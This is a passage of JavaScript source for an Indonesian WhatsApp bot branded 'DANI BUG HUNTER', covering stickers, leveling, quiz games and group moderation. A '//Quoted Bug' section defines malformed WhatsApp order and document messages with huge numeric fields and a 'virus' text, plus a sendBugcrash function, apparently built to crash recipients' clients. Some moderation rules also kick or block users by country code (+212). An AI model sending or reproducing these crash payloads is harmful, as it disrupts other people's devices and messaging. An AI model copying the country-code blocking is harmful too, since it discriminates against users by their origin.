Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticPremium = (hehe) => {
ano = fs.readFileSync('./media/sticker/premium.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticToxic = (hehe) => {
ano = fs.readFileSync('./media/sticker/toxic.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticBan = (hehe) => {
ano = fs.readFileSync('./media/sticker/ban.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticError = (hehe) => {
ano = fs.readFileSync('./media/sticker/error.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticButuhOwner = (hehe) => {
ano = fs.readFileSync('./media/sticker/butuhowner.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticDaftarDulu = (hehe) => {
ano = fs.readFileSync('./media/sticker/daftardulu.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticSudahDaftar = (hehe) => {
ano = fs.readFileSync('./media/sticker/sudahdaftar.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticFiturAktif = (hehe) => {
ano = fs.readFileSync('./media/sticker/fituraktif.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticFiturNoAktif = (hehe) => {
ano = fs.readFileSync('./media/sticker/fiturnoaktif.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}

//Quoted Bug
const troli = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
message: {
orderMessage: {
itemCount : 999999999999999999,
status: 99999999999999999999,
surface : 9999999999999999,
message: virus,
orderTitle: virus,
thumbnail: pp_bot,
sellerJid: '0@s.whatsapp.net'
},
},
};

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© DANI BUG HUNTER`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const lep = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `© DANI BUG HUNTER`, 
"jpegThumbnail": fs.readFileSync('./media/image/bug.jpg'),
}
}
}

const crsh = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© DANI BUG HUNTER ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const vien = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"orderMessage": {
"orderId": "594071395007984",
"thumbnail": pp_bot,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© DANI BUG HUNTER ${ngazap(prefix)}`,
"orderTitle": "© DANI BUG HUNTER ${ngazap(prefix)}",
"sellerJid": "6285714627920@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
}}}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : troli })
return Dani.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

//Dashboard
async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, sender, _cmdUser)
 var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function getPosiCmdUser(sender, _db) {
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].jid === sender) {
posi = i
}
})
return posi
}

//Auto Respon
for (var i = 0; i < commandsDB.length ; i++) {
if (chats.toLowerCase() === commandsDB[i].pesan) {
m.reply(commandsDB[i].balasan)
}
}

const getLevelingXp = (userId) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].jid === userId) {
position = i
}
})
if (position !== false) {
return _level[position].xp
   }
}

const getLevelingLevel = (userId) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].jid === userId) {
position = i
}
})
if (position !== false) {
return _level[position].level
}
}

const getLevelingId = (userId) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].jid === userId) {
position = i
}
})
if (position !== false) {
return _level[position].jid
}
 }

const addLevelingXp = (userId, amount) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].jid === userId) {
position = i
}
})
if (position !== false) {
_level[position].xp += amount
fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}
}

const addLevelingLevel = (userId, amount) => {
let position = false
Object.keys(_level).forEach((i) => {
if (_level[i].jid === userId) {
position = i
}
})
if (position !== false) {
_level[position].level += amount
fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}
}

const addLevelingId = (userId) => {
const obj = {jid: userId, xp: 1, level: 1}
_level.push(obj)
fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}

const getUserRank = (userId) => {
let position = null
let found = false
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
Object.keys(_level).forEach((i) => {
if (_level[i].id === userId) {
position = i
found = true
}
})
if (found === false && position === null) {
const obj = { id: userId, xp: 0, level: 1 }
_level.push(obj)
fs.writeFileSync('./database/level.json', JSON.stringify(_level))
return 99
} else {
return position + 1
}
}

const xpGain = new Set()

const isGained = (userId) => {
return !!xpGain.has(userId)
}

const addCooldown = (userId) => {
xpGain.add(userId)
setTimeout(() => {
return xpGain.delete(userId)
}, 60000) // Each minute
}

var levelRole = getLevelingLevel(sender, _level)
var role = 'Warrior III'
if (levelRole <= 5) {
role = 'Warrior II'
} else if (levelRole <= 10) {
role = 'Warrior I'
} else if (levelRole <= 15) {
role = 'Elite III'
} else if (levelRole <= 20) {
role = 'Elite II'
} else if (levelRole <= 25) {
role = 'Elite I'
} else if (levelRole <= 30) {
role = 'Master III'
} else if (levelRole <= 35) {
role = 'Master II'
} else if (levelRole <= 40) {
role = 'Master I'
} else if (levelRole <= 45) {
role = 'GrandMaster III'
} else if (levelRole <= 50) {
role = 'GrandMaster II'
} else if (levelRole <= 55) {
role = 'GrandMaster I'
} else if (levelRole <= 60) {
role = 'Epic III'
} else if (levelRole <= 65) {
role = 'Epic II'
} else if (levelRole <= 70) {
role = 'Epic I'
} else if (levelRole <= 75) {
role = 'Legend III'
} else if (levelRole <= 80) {
role = 'Legend II'
} else if (levelRole <= 85) {
role = 'Legend I'
} else if (levelRole <= 90) {
role = 'Mythic'
} else if (levelRole <= 95) {
role = 'Mythical Glory'
} else if (levelRole >= 100) {
role = 'Immortal'
} 

//function leveling
if (db.data.chats[m.chat].leveling) {
const currentLevel = getLevelingLevel(m.sender)
const checkId = getLevelingId(m.sender)
try {
addCooldown(m.sender)
if (currentLevel === undefined && checkId === undefined) addLevelingId(m.sender)
const amountXp = Math.floor(Math.random() * 10) + 200
const requiredXp = 200 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(m.sender)
addLevelingXp(m.sender, amountXp)
if (requiredXp <= getLevelingXp(m.sender)) {
addLevelingLevel(m.sender, 1)
try {
ppuser = await Dani.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
teks = `*──「 LEVEL UP 」──*\n\n❏ *Name*:  ${senderr.split("@")[0]}\n❏ *XP*: ${getLevelingXp(m.sender)}\n❏ *Level*: ${getLevel} -> ${getLevelingLevel(m.sender)}\n❏ *Role*: ${role} \n\nCongrats!! 🎉`
let buttons = [
{buttonId: `profile`, buttonText: {displayText: 'PROFILE'}, type: 1}
]
let buttonMessage = {
image: { url: ppuser },
caption: teks,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
}

} catch (err) {
console.error(err)
}
}

async function sendButtonPremium(from) {
let buttons = [
{buttonId: `userpremium`, buttonText: {displayText: '⬡ BUY PREMIUM'}, type: 1}
]
let buttonMessage = {
text: `*Hai Kak ${pushname} ${ucapanWaktu}* 👋\n\n*Untuk Menggunakan Fitur Ini Anda Harus Menjadi Member Premium, Untuk Menjadi Member Premium Silahkan Beli/Buy Premium Di Owner Atau Langsung Menggunakan Saldo User*`,
footer: `_klik button di bawah untuk membeli premium_`,
buttons: buttons,
headerType: 2
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
}
async function sendButtonBanUser(from) {
let buttons = [
{buttonId: `owner`, buttonText: {displayText: '⬡ OWNER'}, type: 1}
]
let buttonMessage = {
text: `*Hai Kak ${pushname} ${ucapanWaktu}* 👋\n\n*Mohon Maaf Akun/Nomor Kak Telah Di Ban Oleh Owner, Silahkan Hubungi Owner Untuk Unban User*`,
footer: `_klik button di bawah untuk meminta unban_`,
buttons: buttons,
headerType: 2
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
}

//Auto Stic Toxic
if (bad.includes(messagesD)) {
ano = fs.readFileSync('./media/sticker/toxic.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}

  // Anti Link
if (db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
let gclink = (`https://chat.whatsapp.com/`+await Dani.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

// Anti Tinyul
if (db.data.chats[m.chat].antilink2) {
if (budy.match(`tinyurl.com/`)) {
m.reply(`「 ANTI LINK TINYUL 」\n\nKamu terdeteksi mengirim link tinyul, maaf kamu akan di kick !`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)        
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

// Anti Cutty
if (db.data.chats[m.chat].antilink3) {
if (budy.match(`cutt.ly/`)) {
m.reply(`「 ANTI LINK CUTTY 」\n\nKamu terdeteksi mengirim link cutty, maaf kamu akan di kick !`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)        
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

// Anti Virtex
if (db.data.chats[m.chat].antivirtex) {
if (budy.length > 3500) {
m.reply('Mark as read\n'.repeat(300))
m.reply(`*▊▊▊DETECTED▊▊▊*\n\n*You sent a virtex, sorry you will be kicked from the group*`)
console.log(('[KICK]', 'red'), color('Received a text virus!', 'yellow'))
Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}  
}

// Anti Wa Me
if (db.data.chats[m.chat].antiwame) {
if (budy.match(`wa.me/`)) {
m.reply(`「 ANTI LINK NOMOR 」\n\nKamu terdeteksi mengirim link nomor, maaf kamu akan di kick !`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)        
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

// Anti Toxic
if (db.data.chats[m.chat].antitoxic) {
if (bad.includes(messagesD)) {
m.reply(`「 ANTI TOXIC 」\n\nKamu terdeteksi berkata kasar, maaf kamu akan di kick !`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)        
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

// Anti Bule
if (db.data.chats[m.chat].antibule) {
if (m.sender.includes(`+212`)) {
m.reply(`「 ANTI BULE 」\n\nKamu Bukan Orang Indonesia, maaf kamu akan di kick !`)
if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)        
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

//anti viewonce 
if (db.data.chats[m.chat].antionce) {
if (m.mtype == 'viewOnceMessage') {
teks = `「 *Anti ViewOnce Message* 」

❏ *Name* : ${m.pushName}
❏ *User* : @${m.sender.split("@")[0]}
❏ *Clock* : ${moment.tz('Asia/Kolkata').format('HH:mm:ss')} 
❏ *Date* : ${moment.tz('Asia/Kolkata').format('DD/MM/YYYY')}
❏ *MessageType* : ${m.mtype}`
Dani.sendTextWithMentions(m.chat, teks, m)
await sleep(500)
m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => m.reply(`Maybe it's been opened by a bot`))
}
}

// Anti Hidetag 
if (db.data.chats[m.chat].antihidetag) {
if (m.mentionedJid.length === participants.length) {
if (!m.isGroup) return 
if (!isBotAdmins) return 
m.reply("Jangan maenin hidetag babi!")
await Dani.groupParticipantsUpdate(m.chat, [m.sender], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}

//Anti Sticker
if (db.data.chats[m.chat].antisticker) {
let isSticker = m.mtype
if(isSticker === "stickerMessage"){		  
if (!m.key.fromMe) {
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`Terdetecsi Mengirim Sticker, Maaf Kamu Akan Di Kick`)
kice = m.sender
await Dani.groupParticipantsUpdate(m.chat, [kice], 'remove')
Dani.sendMessage(from, {text:`*DETECTED*\n\n@${kice.split("@")[0]} *I said no stickers here okay, now get out* `, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
}
}

//Anti Vn
if (db.data.chats[m.chat].antivn) {
let isAudio = m.mtype
if(isAudio === "audioMessage"){		  
if (!m.key.fromMe) {
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`Terdetecsi Mengirim Audio, Maaf Kamu Akan Di Kick`)
kice = m.sender
await Dani.groupParticipantsUpdate(m.chat, [kice], 'remove')
Dani.sendMessage(from, {text:`*DETECTED*\n\n@${kice.split("@")[0]} *I said no voice note here okay, now get out* `, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
}
}

//Antivideo
if (db.data.chats[m.chat].antivideo) {
let isVideo = m.mtype
if(isVideo === "videoMessage"){		  
if (!m.key.fromMe) {
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`Terdetecsi Mengirim Video, Maaf Kamu Akan Di Kick`)
kice = m.sender
await Dani.groupParticipantsUpdate(m.chat, [kice], 'remove')
Dani.sendMessage(from, {text:`*DETECTED*\n\n@${kice.split("@")[0]} *I said no videos here okay, now get out* `, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
}
}

//Anti Image
if (db.data.chats[m.chat].antiphoto) {
let isPhoto = m.mtype
if(isPhoto === "imageMessage"){		  
if (!m.key.fromMe) {
if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
m.reply(`Terdetecsi Mengirim Image, Maaf Kamu Akan Di Kick`)
kice = m.sender
await Dani.groupParticipantsUpdate(m.chat, [kice], 'remove')
Dani.sendMessage(from, {text:`*DETECTED*\n\n@${kice.split("@")[0]} *I said no photos here okay, now get out* `, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
}
}

// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}

// Auto-group sticker
if (db.data.chats[m.chat].autosticker) {
if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await Dani.downloadMediaMessage(qmsg)
await Dani.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Detec Autosticker`)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await Dani.downloadMediaMessage(qmsg)
await Dani.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
}
}

//Auto Respon
if (db.data.chats[m.chat].autorespon) {
let simi = await fetchJson(`${webdani}/api/other/simi-simi?text=${budy}&apikey=${daniapi}`)        
let anu = simi.success 
Dani.sendMessage(from, {text: anu , m})
}

//Autoblock
if (db.data.chats[m.chat].autoblock) {
if (m.chat.includes("@s.whatsapp.net")) {
if (isCreator)
vean = m.sender
await Dani.sendMessage(from, {text:`*▊▊▊AUTO BLOCK▊▊▊*\n\n@${sender.split("@")[0]} *today I'm blocking dumps bye you are _blocked_*`, m})
Dani.updateBlockStatus(m.sender,'block')
}
}

// Anti 212
 if (m.sender.startsWith('212')) {
Dani.updateBlockStatus(from,"block")
}

//Respon Add Item
if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
Dani.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
Dani.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
const nebal = (angka) => {
return Math.floor(angka)
}

function monospace(string) {
return '```' + string + '```'
}   

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: Dani.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Dani.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Dani.ev.emit('messages.upsert', msg)
}

if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
Dani.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebaklagu', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakgambar', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkata', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkata[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = caklontong[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'caklontong', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete caklontong[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkalimat', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebaklirik', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebaktebakan', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakkimia[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkimia', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkimia[m.sender.split('@')[0]]
